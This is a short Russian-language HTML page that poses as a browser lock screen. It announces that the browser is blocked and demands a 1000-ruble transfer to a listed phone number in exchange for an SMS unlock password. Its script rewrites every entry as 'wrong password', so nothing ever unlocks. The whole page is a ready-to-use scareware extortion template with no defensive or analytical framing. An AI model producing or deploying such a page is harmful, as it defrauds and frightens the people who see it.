<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Браузер заблокирован</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: white;
            color: red;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        input {
            margin-top: 10px;
            padding: 5px;
        }
        button {
            margin-top: 10px;
            padding: 5px 10px;
        }
    </style>
</head>
<body>
    <h1>БРАУЗЕР ЗАБЛОКИРОВАН!</h1>
    <p>Для разблокировки браузера переведите 1000 руб. на номер +7 992 246 34 74 и введите пароль из смс в поле ввода</p>
    <input type="text" id="password" placeholder="Введите пароль">
    <button onclick="checkPassword()">ОК</button>

    <script>
        function checkPassword() {
            const passwordInput = document.getElementById('password');
            passwordInput.value = 'Неверный пароль';
        }
    </script>
</body>
</html>
